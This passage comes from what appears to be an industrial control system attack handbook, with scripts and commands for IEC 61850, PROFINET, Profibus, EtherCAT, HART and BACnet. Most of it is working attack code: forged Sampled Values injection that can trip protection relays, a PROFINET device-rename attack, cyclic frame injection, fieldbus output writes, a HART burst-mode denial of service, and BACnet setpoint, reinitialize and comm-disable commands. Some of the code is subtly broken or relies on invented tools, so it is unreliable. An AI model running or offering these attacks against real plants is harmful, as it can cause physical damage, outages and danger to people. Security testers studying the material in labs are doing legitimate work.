tshark -r sv_capture.pcap -Y iecsv -T fields -e frame.time_relative -e sv.svID | \
  awk -F'\t' '{count[$2]++; if ($1 > max[$2]) max[$2]=$1} END {for (id in count) print id": "(count[id]/max[id])" frames/sec"}'
```

### 5.2 SV Injection

```python
#!/usr/bin/env python3
# inject_sv.py - Inject forged Sampled Values frames
# WARNING: Forged SV can cause protection relays to misoperate.
# Lab only with safety officer present.
from scapy.all import Ether, Raw, sendp
import struct

def build_sv_frame(src_mac, sv_id, smp_cnt, samples):
    """Build an SV (IEC 61850 9-2 LE) frame."""
    dst_mac = "01:0C:CD:04:00:XX"  # SV multicast (XX = APPID-specific)
    eth = Ether(src=src_mac, dst="01:0C:CD:04:00:01", type=0x88BA)

    # ASN.1 PDU
    sv_id_bytes = sv_id.encode()
    # APPID + length + reserved
    pdu = (
        b'\x60' + b'\x82' + struct.pack('>H', 50 + len(samples)*8) +
        b'\x80\x02\x00\x01' +  # APPID
        b'\x81\x02' + struct.pack('>H', 50 + len(samples)*8) +
        b'\x00\x00\x00\x00' +  # reserved
        # SV PDU
        b'\xa0' + b'\x82' + struct.pack('>H', 40 + len(samples)*8) +
        b'\x80' + bytes([len(sv_id_bytes)]) + sv_id_bytes +  # svID
        b'\x82\x01\x02' +  # confRef = 2
        b'\x83\x02' + struct.pack('>H', smp_cnt) +  # smpCnt
        b'\x85\x01\x01' +  # smpSynch = 1 (local sync)
        b'\x87' + bytes([len(samples)*8]) + b''.join(struct.pack('>i', s) for s in samples)
    )

    return eth / Raw(load=pdu)

if __name__ == "__main__":
    # Inject 50Hz waveform at 4000 samples/sec
    import math
    smp_cnt = 0
    while True:
        # 80 samples per cycle at 50Hz = 4000 samples/sec
        angle = (smp_cnt % 80) / 80 * 2 * math.pi
        sample_a = int(30000 * math.sin(angle))  # ~300A primary
        sample_b = int(30000 * math.sin(angle - 2*math.pi/3))
        sample_c = int(30000 * math.sin(angle + 2*math.pi/3))
        frame = build_sv_frame(
            src_mac="00:11:22:33:44:55",
            sv_id="MU01",
            smp_cnt=smp_cnt,
            samples=[sample_a, 0, sample_b, 0, sample_c, 0, 0, 0]  # 4 currents + 4 voltages
        )
        sendp(frame, iface="eth0", verbose=0)
        smp_cnt = (smp_cnt + 1) % 4000
        # 250us interval
        time.sleep(0.00025)
```

---

## 6. IEC 61850 MMS

MMS (Manufacturing Message Specification) is the TCP/IP part of IEC 61850 used for configuration, supervision, and slow control. Runs on TCP port 102 (same as S7comm).

### 6.1 MMS Reconnaissance

```bash
# Discover MMS servers (TCP 102, S7comm OR MMS)
nmap -p 102 -sV 192.168.1.0/24

# Distinguish MMS from S7comm by looking at TPKT/COTP bytes
# MMS uses COTP class 0 with specific headers
# S7comm uses COTP with specific param values

# Use libiec61850 client to probe
./examples/iec61850/client/client_example 192.168.1.20 102

# Wireshark MMS dissector
wireshark -r mms_capture.pcap -Y mms &

# Extract logical device list
tshark -r mms_capture.pcap -Y "mms.confirmedServiceRequest && mms.invokeID == 1" -V
```

### 6.2 libiec61850 Client Examples

```bash
# Build libiec61850
git clone https://github.com/mz-automation/libiec61850.git
cd libiec61850 && mkdir build && cd build
cmake -DBUILD_EXAMPLES=ON ..
make -j$(nproc)

# Connect to IED and enumerate logical devices
./examples/iec61850/client/iec61850_client_example 192.168.1.20

# Get variable names
./examples/iec61850/client/iec61850_client_example 192.168.1.20 getNameList LD*

# Read GetDataValues
./examples/iec61850/client/iec61850_client_example 192.168.1.20 read LD0/LLN0.Mod.stVal

# Write SetDataValues (if permitted)
./examples/iec61850/client/iec61850_client_example 192.168.1.20 write LD0/CSWI1.Pos.Oper.ctlVal 1
```

### 6.3 MMS Write to Control Object

```python
#!/usr/bin/env python3
# mms_operate.py - Send Operate (SetDataValues with control)
# WARNING: This can trigger physical breaker operations. Lab only.
from scapy.all import IP, TCP
import socket, struct, sys

def build_mms_operate(common_addr, object_ref):
    """Build minimal MMS Operate request (simplified)."""
    # Full MMS requires ASN.1 PER encoding; use libiec61850 client instead
    # for actual testing. This is illustrative.
    return bytes.fromhex("030000770200f0800001000b15010b1200444c302f4c4c4e30244d6f6424737456616c")

def send_mms_operate(target_ip, port, object_ref):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((target_ip, port))
    # Send COTP CR (Connect Request) first
    # Then MMS Initiate-Request-PDU
    # Then the Operate
    # (Sequence is complex; use libiec61850 client for actual testing)
    print(f"[+] Use libiec61850 client to operate {object_ref} on {target_ip}")
    print(f"    Example: iec61850_client_example {target_ip} 102 write {object_ref} 1")
    s.close()

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.20"
    obj = sys.argv[2] if len(sys.argv) > 2 else "LD0/CSWI1.Pos.Oper.ctlVal"
    send_mms_operate(target, 102, obj)
```

### 6.4 MMS Server Enumeration

```python
#!/usr/bin/env python3
# mms_enumerate.py - Enumerate MMS IED logical devices
# Uses pyiec61850 (Python bindings for libiec61850)
import ctypes, sys

def enum_logical_devices(target_ip, port=102):
    """Connect to IED and list logical devices and data objects."""
    try:
        lib = ctypes.CDLL("./libiec61850.so")
    except OSError:
        print("[-] libiec61850.so not found. Build libiec61850 first.")
        return

    con = lib.IedConnection_create()
    error = ctypes.c_int(0)
    lib.IedConnection_connect(con, ctypes.byref(error), target_ip.encode(), port)

    if error.value != 0:
        print(f"[-] Connection failed: {error.value}")
        return

    # Get list of logical devices
    ld_list = lib.IedConnection_getLogicalDeviceList(con, ctypes.byref(error))
    ld = ld_list
    while ld:
        ld_name = ctypes.cast(ld, ctypes.POINTER(ctypes.c_char_p)).contents.value
        print(f"[+] Logical Device: {ld_name.decode()}")
        # Enumerate logical nodes
        ln_list = lib.IedConnection_getLogicalDeviceDirectories(con, ctypes.byref(error), ld_name)
        ln = ln_list
        while ln:
            ln_name = ctypes.cast(ln, ctypes.POINTER(ctypes.c_char_p)).contents.value
            print(f"    Logical Node: {ln_name.decode()}")
            ln = lib.LinkedList_getNext(ln)
        ld = lib.LinkedList_getNext(ld)

    lib.IedConnection_close(con)
    lib.IedConnection_destroy(con)

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.20"
    enum_logical_devices(target)
```

---

## 7. PROFINET

PROFINET (PROFIBUS over ETHERNET) is the dominant Ethernet fieldbus for Siemens-centric discrete manufacturing. Two variants: PROFINET RT (real-time) at <1ms and PROFINET IRT (isochronous real-time) at <1ms with strict determinism.

### 7.1 PROFINET Discovery

```bash
# PROFINET uses Ethertype 0x8892 with DCP (Discovery and Configuration Protocol)
sudo tcpdump -i eth0 -w pn_dcp.pcap ether proto 0x8892

# Use nmap broadcast script
nmap --script broadcast-pn-dcp-identify -e eth0

# Wireshark PROFINET DCP dissector
wireshark -r pn_dcp.pcap -Y "pn_dcp" &

# Extract all PROFINET devices
tshark -r pn_dcp.pcap -Y pn_dcp -T fields \
  -e eth.src -e pn_dcp.nameOfStation -e pn_dcp.deviceVendor -e pn_dcp.deviceProduct

# Identify PROFINET IO controllers vs devices
tshark -i eth0 -Y "pn_dcp && pn_dcp.option.deviceRole" -T fields \
  -e eth.src -e pn_dcp.deviceRoleValue
```

### 7.2 PROFINET DCP Identify Script

```python
#!/usr/bin/env python3
# pn_dcp_identify.py - Broadcast PROFINET DCP Identify
from scapy.all import Ether, Raw, sendp, sniff
import struct, threading

def build_dcp_identify():
    """Build DCP Identify All (broadcast) frame."""
    # PROFINET multicast: 01-0E-CF-00-00-00
    dst = "01:0E:CF:00:00:00"
    src = "00:11:22:33:44:55"
    eth = Ether(src=src, dst=dst, type=0x8892)
    # DCP frame ID 0xFEFF = Identify Multicast
    # Service ID 0x05 = Identify, ServiceType 0x00 = Request
    frame_id = 0xFEFF
    service_id = 0x05
    service_type = 0x00
    xid = 0x00000001
    response_delay = 0
    dcp_data_length = 2  # empty option
    dcp_payload = struct.pack(">HHIHH",
        frame_id,
        (service_id << 4) | service_type,
        xid,
        response_delay,
        dcp_data_length
    )
    # Option: 0xFF = All, suboption 0xFF = All
    dcp_payload += b'\xFF\xFF\x00\x00'
    return eth / Raw(load=dcp_payload)

def capture_responses(timeout=5):
    """Capture DCP Identify responses."""
    sniff(prn=lambda p: print(f"[+] Response from {p.src}: {bytes(p[Raw]).hex()}"),
          filter="ether proto 0x8892", timeout=timeout, iface="eth0")

if __name__ == "__main__":
    print("[*] Sending DCP Identify broadcast...")
    sendp(build_dcp_identify(), iface="eth0", verbose=0)
    capture_responses(timeout=5)
```

### 7.3 PROFINET DCP Spoofing (Rename Attack)

```python
#!/usr/bin/env python3
# pn_dcp_rename.py - Rename a PROFINET device via DCP Set
# WARNING: Renaming a configured device will cause it to drop from the
# IO Controller's session, causing production line shutdown.
from scapy.all import Ether, Raw, sendp
import struct

def build_dcp_set_rename(target_mac, new_name):
    """Forge a DCP Set to rename the device."""
    src = "00:11:22:33:44:55"
    eth = Ether(src=src, dst=target_mac, type=0x8892)

    frame_id = 0xFEFB  # Identify Response or Set
    service_id = 0x04  # Set
    service_type = 0x00  # Request
    xid = 0x00000002

    # DCP block: device name option (0x02), suboption (0x02)
    name_bytes = new_name.encode()
    block_header = struct.pack(">BB", 0x02, 0x02)
    block_length = len(name_bytes)
    if block_length % 2 != 0:
        name_bytes += b'\x00'  # pad
    block_value = struct.pack(">H", block_length) + name_bytes

    dcp_data_length = 4 + len(block_value)  # block header + value
    dcp_payload = struct.pack(">HHIHH",
        frame_id,
        (service_id << 4) | service_type,
        xid,
        0,  # response_delay
        dcp_data_length
    )
    dcp_payload += block_header + block_value

    return eth / Raw(load=dcp_payload)

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: pn_dcp_rename.py <target_mac> <new_name>")
        sys.exit(1)
    target = sys.argv[1]
    new_name = sys.argv[2]
    frame = build_dcp_set_rename(target, new_name)
    print(f"[+] Sending DCP Set to rename {target} to '{new_name}'")
    sendp(frame, iface="eth0", verbose=0)
```

### 7.4 PROFINET RT Frame Injection

```python
#!/usr/bin/env python3
# pn_rt_inject.py - Inject PROFINET RT cyclic frames
# WARNING: This can crash motion control loops.
from scapy.all import Ether, Raw, sendp
import struct, time

def build_rt_frame(src_mac, frame_id=0x8000, cycle_counter=0, data_bytes=b''):
    """Build PROFINET RT frame."""
    # PROFINET RT multicast: 01-0E-CF-00-04-XX
    dst = "01:0E:CF:00:00:01"
    eth = Ether(src=src_mac, dst=dst, type=0x8892)
    # Frame ID identifies the RT stream
    rt_data = struct.pack(">H", frame_id) + struct.pack(">H", cycle_counter)
    return eth / Raw(load=rt_data + data_bytes)

if __name__ == "__main__":
    src = "00:11:22:33:44:55"
    # RT frames sent every 31.25us (32kHz) for 1ms cycle
    cycle = 0
    while True:
        frame = build_rt_frame(src, frame_id=0x8000, cycle_counter=cycle, data_bytes=b'\x00'*40)
        sendp(frame, iface="eth0", verbose=0)
        cycle = (cycle + 1) % 65536
        time.sleep(0.001)  # 1ms - adjust for cycle time
```

### 7.5 PROFINET ProfiShark Capture

```bash
# ProfiShark is a specialized tap for PROFINET/PROFIBUS
# Requires hardware tap (ProfiShark 1G/100M)

# Capture PROFINET traffic via ProfiShark
profishark-cli capture --interface tap0 --duration 60 --output pn_lab.pcap

# Real-time monitoring
profishark-cli monitor --interface tap0 --filter "pn_rt || pn_dcp"

# Extract RT cycle timing statistics
profishark-cli analyze pn_lab.pcap --metric cycle-time --output cycle_stats.csv

# Identify PROFINET IO Controller (RT frame ID 0x8000/0x8001)
tshark -r pn_lab.pcap -Y "pn_rt && pn_rt.frameID == 0x8000" -T fields \
  -e eth.src -e frame.time_relative | sort | uniq -c | head
```

---

## 8. Profibus DP/PA

Profibus DP (Decentralized Peripherals) is the dominant serial fieldbus for factory automation. Profibus PA (Process Automation) is the intrinsically-safe variant used in hazardous areas at 31.25 kbps.

### 8.1 Profibus DP Reconnaissance

```bash
# Profibus DP runs on RS-485 at 9.6kbps to 12Mbps
# No IP - requires serial tap (ProfiShark DP, Softing ProfiShark)

# Capture Profibus DP via ProfiShark
profishark-cli capture --interface tap_serial --baud 1500 --output dp.pcap

# Profibus PA capture (31.25kbps)
profishark-cli capture --interface tap_pa --baud 31.25 --output pa.pcap
```

### 8.2 Profibus Frame Format

```
Profibus DP frame structure:
  SD1 = 0x68 (start delimiter for fixed length)
  SD2 = 0x68 (start delimiter for variable length)
  SD3 = 0xA2 (start delimiter for short ack)
  SD4 = 0xDC (start delimiter for token)

  Frame format (variable length):
    SD2 | LE | LEr | SD2 | DA | SA | FC | DSAP | SSAP | DU | FCS | ED

  Where:
    DA = Destination Address (0-126)
    SA = Source Address (0-126)
    FC = Function Code (request/response)
    DSAP = Destination Service Access Point
    SSAP = Source Service Access Point
    DU = Data Unit
    FCS = Frame Check Sequence (XOR)
    ED = End Delimiter (0x16)
```

### 8.3 Profibus Active Scanning

```bash
# Use profibus_sniffer to identify slave addresses
python3 profibus_sniffer.py --serial /dev/ttyUSB0 --baud 1500

# Send SRD (Send and Request Data) to enumerate slaves
python3 -c "
import serial
s = serial.Serial('/dev/ttyUSB0', 1500000, parity=serial.PARITY_EVEN)
# Profibus SD2 token frame to query slave 1
token = bytes.fromhex('DC0102 16'.replace(' ',''))
s.write(token)
print(s.read(256).hex())
"
```

### 8.4 Profibus Injection

```python
#!/usr/bin/env python3
# profibus_inject.py - Send a Profibus DP frame to a slave
import serial, struct

def profibus_fcs(data):
    """Compute Profibus frame check sequence (XOR)."""
    fcs = 0
    for b in data:
        fcs ^= b
    return fcs & 0xFF

def build_srd_frame(sa, da, dsap, ssap, du):
    """Build SD2 frame for Send/Request Data."""
    # SD2 | LE | LEr | SD2 | DA | SA | FC | DSAP | SSAP | DU | FCS | ED
    # LE and LEr are identical (length of DA through DU)
    body = bytes([da, sa, 0x5C, dsap, ssap]) + du
    le = len(body) + 1  # include FCS
    return bytes([0x68, le, le, 0x68]) + body + bytes([profibus_fcs(body), 0x16])

if __name__ == "__main__":
    s = serial.Serial('/dev/ttyUSB0', 1500000, parity=serial.PARITY_EVEN)
    # Write to output data of slave 3, DSAP=0x60 (output)
    frame = build_srd_frame(sa=1, da=3, dsap=0x60, ssap=0x60, du=b'\x01\xFF\xFF')
    print(f"Sending: {frame.hex()}")
    s.write(frame)
    import time; time.sleep(0.5)
    print(f"Response: {s.read(256).hex()}")
    s.close()
```

### 8.5 Profibus PA Considerations

Profibus PA runs at 31.25 kbps on MBP (Manchester-encoded Bus Powered) physical layer. The protocol is identical to Profibus DP at the link layer but the physical layer provides intrinsic safety (Ex i) for hazardous areas.

```bash
# Profibus PA capture requires specialized coupler (e.g., Pepperl+Fuchs DPI)
# Use DP/PA segment coupler and capture on DP side
profishark-cli capture --interface tap_dp --baud 45.45 --output pa.pcap

# Decode PA-specific diagnostic messages
tshark -r pa.pcap -Y "profibus && profibus.dsap == 0x3C" -V
```

---

## 9. EtherCAT

EtherCAT (Ethernet for Control Automation Technology) is a real-time Ethernet fieldbus used primarily with Beckhoff TwinCAT. It uses Ethertype 0x88A4 and operates at <100us cycle times.

### 9.1 EtherCAT Discovery

```bash
# Capture EtherCAT frames
sudo tcpdump -i eth0 -w ecat.pcap ether proto 0x88a4

# Identify EtherCAT master
tshark -r ecat.pcap -Y ecat -T fields \
  -e eth.src -e eth.dst | sort | uniq -c

# Count EtherCAT frame types
tshark -r ecat.pcap -Y ecat -T fields -e ecat.type | sort | uniq -c

# Extract slave device info via SII (Slave Information Interface)
tshark -r ecat.pcap -Y "ecat.type == 0x04" -V
```

### 9.2 EtherCAT Mailbox (CoE) Enumeration

```python
#!/usr/bin/env python3
# ecat_mailbox_scan.py - Enumerate EtherCAT slaves via mailbox
from scapy.all import Ether, Raw, sendp, sniff
import struct

def build_ecat_frame(data):
    """Build EtherCAT frame with mailbox payload."""
    # EtherCAT frames are addressed to 00:00:00:00:00:00 or specific slave
    eth = Ether(src="00:11:22:33:44:55", dst="AA:BB:CC:DD:EE:FF", type=0x88A4)
    # EtherCAT header: length (11 bits) + reserved + type (4 bits)
    ecat_hdr = struct.pack(">H", (len(data) << 4) | 0x04)  # Type 4 = mailbox
    return eth / Raw(load=ecat_hdr + data)

def build_mailbox_sdo_info(slave_addr, od_index):
    """Build mailbox SDO Info Upload request."""
    # Mailbox header: length, address, priority, type + counter
    mb_hdr = struct.pack("<HHHBB",
        10,             # mailbox length
        slave_addr,     # slave address
        0x0000,         # master address
        0x03,           # mailbox type: CoE
        0x01            # counter
    )
    # CoE SDO Info Upload Request
    coe_sdo = struct.pack("<HBBIHBB",
        0x2000,         # opcode + response flag
        0x0000,         # reserved
        od_index,       # SDO index
        0x00,           # subindex
        0x00, 0x00      # padding
    )
    return mb_hdr + coe_sdo

if __name__ == "__main__":
    # Send SDO Info Upload for OD 0x1000 (device type)
    payload = build_mailbox_sdo_info(slave_addr=0x1001, od_index=0x1000)
    frame = build_ecat_frame(payload)
    sendp(frame, iface="eth0", verbose=0)
    # Capture response
    sniff(prn=lambda p: print(f"[+] Response: {bytes(p[Raw]).hex()}"),
          filter="ether proto 0x88a4", timeout=2, iface="eth0")
```

### 9.3 EtherCAT Mailbox CoE Write

```python
#!/usr/bin/env python3
# ecat_coe_write.py - Write to EtherCAT slave via CoE SDO
from scapy.all import Ether, Raw, sendp
import struct

def build_ecat_coe_write(slave_addr, od_index, subindex, value):
    """Build EtherCAT mailbox CoE SDO Download (write)."""
    eth = Ether(src="00:11:22:33:44:55", dst="AA:BB:CC:DD:EE:FF", type=0x88A4)

    # Mailbox header
    mb_hdr = struct.pack("<HHHBB", 12, slave_addr, 0x0000, 0x03, 0x01)

    # CoE SDO Download Request
    # 0x2x = SDO Download Request
    # Size indicator + complete access + size (4 bytes for uint32)
    coe_hdr = struct.pack("<BBBB",
        0x23,   # opcode = SDO download, expedited, 4 bytes
        subindex & 0xFF,
        od_index & 0xFF,
        (od_index >> 8) & 0xFF
    )

    data = struct.pack("<I", value)
    ecat_hdr = struct.pack(">H", (10 + 4 + 4) << 4 | 0x04)

    return eth / Raw(load=ecat_hdr + mb_hdr + coe_hdr + data)

if __name__ == "__main__":
    # Write value 0x12345678 to OD 0x6000:00 (slave output)
    frame = build_ecat_coe_write(slave_addr=0x1001, od_index=0x6000, subindex=0, value=0x12345678)
    sendp(frame, iface="eth0", verbose=0)
```

### 9.4 EtherCAT Frame Fuzzing

```python
#!/usr/bin/env python3
# fuzz_ecat.py - Boofuzz template for EtherCAT
from boofuzz import *

def main():
    session = Session(target=Target(connection=RawEthernetConnection("eth0", dst_mac="AA:BB:CC:DD:EE:FF")))

    s_initialize("ecat_frame")
    s_static("\xAA\xBB\xCC\xDD\xEE\xFF")  # dst
    s_static("\x00\x11\x22\x33\x44\x55")  # src
    s_static("\x88\xA4")  # EtherType
    # EtherCAT header
    s_word(0x1040, endian=">", name="hdr", fuzz_values=[0x0040, 0x1040, 0x2040, 0xFF40])
    # Datagram
    s_byte(0x0A, name="cmd", fuzz_values=range(0, 16))   # APRD, APWR, etc.
    s_byte(0x01, name="idx")
    s_word(0x0000, endian="<", name="addr")  # ring position
    s_word(0x0000, endian="<", name="offset")
    s_word(0x0004, endian="<", name="len_flags", fuzz_values=[0x0010, 0x0410, 0xFC10])
    s_word(0x0000, endian="<", name="irq")
    s_dword(0x00000000, endian="<", name="data", fuzz_values=[0, 0xDEADBEEF, 0xFFFFFFFF])
    s_word(0x0000, endian="<", name="wkc")
    s_byte(0x00, name="next_dlg")

    session.connect(s_get("ecat_frame"))
    session.fuzz()

if __name__ == "__main__":
    main()
```

---

## 10. Foundation Fieldbus

Foundation Fieldbus (FF) is the dominant process automation fieldbus for oil & gas, chemical, and pharmaceutical. Two variants: H1 (31.25kbps intrinsically safe) and HSE (High Speed Ethernet, 100Mbps).

### 10.1 Foundation Fieldbus H1

```bash
# FF H1 runs at 31.25kbps on Manchester-encoded Bus Powered (MBP)
# Requires specialized FF H1 modem or segment coupler

# Capture FF H1 via Pepperl+Fuchs DPI or similar
# (typically only available via vendor-specific capture tools)

# Wireshark FF H1 dissector (use vendor capture file)
wireshark -r ff_h1.pcap -Y "ff || ff_h1" &

# Identify Link Active Scheduler (LAS)
tshark -r ff_h1.pcap -Y "ff_h1.pdu_type == 1" -T fields \
  -e eth.src -e ff_h1.src_addr
```

### 10.2 FF H1 Frame Format

```
FF H1 Preamble: 7+ bytes 0x55 (clock sync)
Start Delimiter: 1 byte (0x80-0xBF)
Data: variable
Frame Check Sequence: 2 bytes CRC
End Delimiter: 1 byte (0x40-0x7F)

PDU Types:
  0 = Token
  1 = Pass Token / LAS
  2 = Return Token
  3 = Force H1 State
  4 = Probe Node
  5 = Probe Response
  6 = Time Distribution
  7 = Compel Data (CD)
  8 = Data
```

### 10.3 Foundation Fieldbus HSE

```bash
# FF HSE runs on standard Ethernet at 100Mbps
sudo tcpdump -i eth0 -w ff_hse.pcap port 1090 or port 3489

# Identify FF HSE devices via UDP broadcast
nmap -sU -p 1090,3489 --script ff-discovery 192.168.1.0/24

# Wireshark FF HSE dissector
wireshark -r ff_hse.pcap -Y "ff_hse" &

# Extract FF HSE VCR (Virtual Communication Relationship) info
tshark -r ff_hse.pcap -Y ff_hse -T fields \
  -e ip.src -e ff_hse.vcr_id | sort -u
```

### 10.4 FF H1 LAS Spoofing (Concept)

```python
#!/usr/bin/env python3
# ff_h1_las_spoof.py - Spoof LAS (Link Active Scheduler)
# WARNING: This is conceptual - FF H1 requires specialized hardware
# The LAS controls the fieldbus segment and grants tokens to devices
from scapy.all import Ether, Raw
import struct

def build_ff_h1_token(target_addr):
    """Build FF H1 Token PDU (conceptual)."""
    # FF H1 frames don't use Ethernet; this is for FF HSE equivalent
    eth = Ether(src="00:11:22:33:44:55", dst="01:00:5E:00:00:01", type=0x0800)
    # Conceptual payload - real FF H1 requires serial hardware
    payload = struct.pack(">BBB", 0x55, 0x80, 0x00)  # preamble + start + token type
    payload += struct.pack(">H", target_addr)
    payload += b'\x00\x00\x00\x40'  # FCS + end delimiter
    return eth / Raw(load=payload)
```

---

## 11. HART

HART (Highway Addressable Remote Transducer) is a hybrid protocol that superimoses digital FSK communication on 4-20mA current loops. Used for instrument configuration and diagnostics in process automation.

### 11.1 HART Reconnaissance

```bash
# HART over serial requires a HART modem (USB-HART or HART interface)
# Common: Procitec HART USB, Rosemount 275/375 HART communicator

# Identify HART device at polling address 0
python3 -c "
import serial
s = serial.Serial('/dev/ttyUSB0', 1200, parity=serial.PARITY_ODD, bytesize=8)
# HART command 0: Read Unique Identifier
# Preamble: 5+ bytes 0xFF
# Start byte: 0x82 (short frame for addr 0)
# Command: 0x00, byte count: 0x00
preamble = b'\xFF' * 5
start = b'\x82'
cmd = b'\x00\x00'
# Checksum: XOR of start + cmd
chk = 0
for b in (start + cmd): chk ^= b
frame = preamble + start + cmd + bytes([chk])
print(f'Sending: {frame.hex()}')
s.write(frame)
import time; time.sleep(1)
print(f'Response: {s.read(256).hex()}')
"
```

### 11.2 HART Universal Commands

```python
#!/usr/bin/env python3
# hart_universal.py - HART universal commands
# Universal commands 0-35 are implemented by ALL HART devices

HART_COMMANDS = {
    0: "Read Unique Identifier",
    1: "Read Primary Variable",
    2: "Read Loop Current and Percent of Range",
    3: "Read Dynamic Variables and Loop Current",
    6: "Write Polling Address",
    11: "Read Unique Identifier Associated with Tag",
    12: "Read Message",
    13: "Read Tag, Descriptor, Date",
    14: "Read Primary Variable Sensor Information",
    15: "Read Sensor Information",
    16: "Read Final Assembly Number",
    17: "Write Final Assembly Number",
    18: "Write Tag, Descriptor, Date",
    19: "Write Final Assembly Number",
    20: "Read Long Tag",
    21: "Write Long Tag",
    22: "Write Final Assembly Number",
    33: "Read Device Variables",
    34: "Write Damping Value",
    35: "Write Range Values",
}

def build_hart_frame(addr, command, data=b''):
    """Build HART frame (long frame for addr > 0)."""
    preamble = b'\xFF' * 5
    if addr == 0:
        # Short frame: start 0x82 (master to slave 0)
        start = b'\x82'
        body = start + bytes([command, len(data)]) + data
    else:
        # Long frame: 0x82 OR'd with address
        # Start byte format: PMTY 1 L LLLL AAA AAAA
        # Where L = address length, A = polling address
        start = bytes([0x80 | (addr & 0x3F)])
        body = start + bytes([command, len(data)]) + data
    chk = 0
    for b in body:
        chk ^= b
    return preamble + body + bytes([chk])

if __name__ == "__main__":
    import serial
    s = serial.Serial('/dev/ttyUSB0', 1200, parity=serial.PARITY_ODD)
    # Read primary variable (command 1)
    s.write(build_hart_frame(0, 1))
    import time; time.sleep(0.5)
    response = s.read(256)
    print(f"Response: {response.hex()}")
    # Parse response code
    if len(response) > 5:
        print(f"  Status: {hex(response[5] >> 6)} (0=OK, 1=undefined, 2=error)")
```

### 11.3 HART Burst Mode

```python
#!/usr/bin/env python3
# hart_burst.py - Configure HART burst mode for DoS
# WARNING: Burst mode causes device to continuously transmit, blocking loop
import serial

def enable_burst_mode(device_addr, burst_msg=2):
    """Enable burst message 0-7 on device."""
    # HART command 109: Write Burst Mode Parameters
    # Note: command 109 is device-specific (not universal)
    preamble = b'\xFF' * 5
    start = bytes([0x82 | (device_addr & 0x3F)])  # long frame
    cmd = 109
    data = bytes([burst_msg, 0x00, 0x01])  # enable burst message N
    body = start + bytes([cmd, len(data)]) + data
    chk = 0
    for b in body:
        chk ^= b
    return preamble + body + bytes([chk])

if __name__ == "__main__":
    s = serial.Serial('/dev/ttyUSB0', 1200, parity=serial.PARITY_ODD)
    s.write(enable_burst_mode(0))
    import time; time.sleep(0.5)
    print(f"Response: {s.read(256).hex()}")
```

### 11.4 WirelessHART

```bash
# WirelessHART runs on IEEE 802.15.4 at 2.4GHz with channel hopping
# Uses AES-128 encryption (mandatory)

# Capture WirelessHART with specialized 802.15.4 SDR
# Requires hardware: Atmel RZUSBSTICK, TI CC2531
killerbee -i /dev/ttyUSB0 -c 11 -w wireless_hart.pcap

# Wireshark WirelessHART dissector
wireshark -r wireless_hart.pcap -Y "whart" &

# WirelessHART join flooding (DoS)
# Attack: send join requests from random EUI-64 to drain gateway resources
python3 -c "
from killerbee import *
kb = KillerBee('/dev/ttyUSB0')
kb.channel(11)
# Build IEEE 802.15.4 frame with WirelessHART join payload
# Note: encrypted join requires network key; this is for testing unencrypted
"
```

---

## 12. BACnet

BACnet (Building Automation and Control Networks) is the dominant building automation protocol. Runs on UDP 47808 and has no built-in authentication in the base protocol. BACnet/SC adds TLS and authentication.

### 12.1 BACnet Discovery

```bash
# BACnet Who-Is broadcast
python3 -c "
from bacpypes.object import get_datatype
from bacpypes.constructeddata import Array
import socket, struct

# BACnet Who-Is broadcast
# BVLCC: 0x81 (type BACnet/IP) 0x0B (function = original-unicast-NPDU)
# NPDU: 0x01 (version) 0x04 (control = who-is)
# APDU: 0x00 (PDU type = confirmed-req) 0x08 (service choice = whoIs)
dst = ('255.255.255.255', 47808)
packet = bytes.fromhex('810a00180104' + '00240801240280f0')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
s.sendto(packet, dst)
s.settimeout(3)
try:
    while True:
        data, addr = s.recvfrom(4096)
        print(f'Response from {addr}: {data.hex()}')
except socket.timeout:
    pass
"

# Use nmap NSE
nmap -sU -p 47808 --script bacnet-info 192.168.1.0/24

# Wireshark BACnet dissector
wireshark -r bacnet.pcap -Y bacnet &
```

### 12.2 BACnet Object Enumeration

```python
#!/usr/bin/env python3
# bacnet_enum.py - Enumerate BACnet objects
from bacpypes.app import BIPSimpleApplication
from bacpypes.core import run
from bacpypes.object import get_datatype
from bacpypes.apdu import ReadPropertyRequest
from bacpypes.constructeddata import Array
import asyncio

async def enumerate_objects(target_ip, device_id):
    """Enumerate all objects on a BACnet device."""
    # ReadProperty device.object-list
    # Returns array of (object-type, instance) tuples
    pass  # Real implementation requires bacpypes async setup

if __name__ == "__main__":
    # Use YABACT or similar tool for command-line enumeration
    print("Use YABACT: bacnetdiscover -n 192.168.1.0/24")
    print("Then: bacnetread -d 192.168.1.50 -t device,100 -p object-list")
```

```bash
# Use YABACT for BACnet enumeration
bacnetdiscover -n 192.168.1.255 --who-is 0-4194303

# Read device object list
bacnetread -d 192.168.1.50 -t device,100 -p object-list

# Read each analog output's present value
for obj in 1 2 3 4 5; do
  bacnetread -d 192.168.1.50 -t analogOutput,$obj -p present-value
done

# Read object description
bacnetread -d 192.168.1.50 -t analogOutput,1 -p description

# Read vendor ID
bacnetread -d 192.168.1.50 -t device,100 -p vendor-identifier
```

### 12.3 BACnet WriteProperty Exploitation

```bash
# Write Present_Value on Analog Output (HVAC setpoint)
# WARNING: This changes physical output. Lab only.
bacnetwrite -d 192.168.1.50 -t analogOutput,1 -p present-value -v 75.5

# Write to Binary Output (lighting/relay)
bacnetwrite -d 192.168.1.50 -t binaryOutput,1 -p present-value -v inactive

# Send ReinitializeDevice (most devices accept without auth)
bacnetwrite -d 192.168.1.50 --reinitialize warmstart

# Send DeviceCommunicationControl (DoS - disables BACnet comms)
bacnetwrite -d 192.168.1.50 --comm-control disable 60
```

### 12.4 BACnet/SC (Secure Connect)

```bash
# BACnet/SC uses TLS on TCP 47808 with X.509 certificates
# Discovery via DNS-SD _bacnet._tcp.local

# Discover BACnet/SC nodes via mDNS
avahi-browse -rt _bacnet._tcp

# Test BACnet/SC TLS
openssl s_client -connect 192.168.1.50:47808 -showcerts

# Validate certificate chain
openssl s_client -connect 192.168.1.50:47808 -CAfile ca-chain.crt

# Test for insecure fallback to BACnet/IPv4 (UDP 47808)
nmap -sU -p 47808 192.168.1.50
```

### 12.5 BACnet Fuzzing

```python
#!/usr/bin/env python3
# fuzz_bacnet.py - Boofuzz template for BACnet
from boofuzz import *

def main():
